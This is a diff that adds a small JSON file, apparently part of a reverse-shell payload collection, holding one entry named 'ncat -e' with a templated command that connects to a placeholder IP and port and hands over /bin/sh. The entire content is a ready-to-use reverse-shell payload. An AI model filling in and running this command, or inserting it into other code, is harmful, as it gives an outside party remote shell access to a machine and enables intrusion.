@@ -1,0 +1,6 @@
+[
+    {
+        "name": "ncat -e",
+        "payload": "ncat {%ip%} {%port%} -e /bin/sh"
+    }
+]
